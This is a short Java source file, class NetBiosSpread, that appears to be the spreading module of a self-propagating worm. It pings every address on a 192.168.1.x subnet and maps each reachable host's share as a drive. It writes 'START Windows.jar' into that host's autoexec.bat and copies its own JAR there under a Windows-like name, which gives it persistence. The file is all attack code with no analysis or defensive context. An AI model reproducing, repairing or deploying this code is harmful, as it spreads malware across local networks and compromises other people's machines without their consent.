
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.net.InetAddress;
import java.util.ArrayList;
import java.util.logging.Level;
import java.util.logging.Logger;

/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
/**
 *
 * @author Nathan
 */
public class NetBiosSpread {

    private static ArrayList<String> validHosts = new ArrayList<String>();

    public void initNetbios() {
        scanHosts();
        try {
            infectHosts();
        } catch (IOException ex) {
            Logger.getLogger(NetBiosSpread.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    public static void scanHosts() {
        for (int i = 1; i < 256; i++) {
            if (validHost("192.168.1." + i)) {
                validHosts.add("192.168.1." + i);
            }
        }
    }

    public static void infectHosts() throws IOException {
        for (String s : validHosts) {
            Runtime.getRuntime().exec(new String[]{"net use", "z:", "//" + s + "/CDISK"});
            BufferedWriter bw = new BufferedWriter(new FileWriter("z:\\autoexec.bat"));
            bw.newLine();
            bw.write("START Windows.jar");
            bw.close();
            Misc.copy(Misc.getJARLoc(), "z:\\Windows.jar");
        }
    }

    public static boolean validHost(String host) {
        try {
            return InetAddress.getByName(host).isReachable(1000);
        } catch (Exception ex) {
            return false;
        }
    }
}

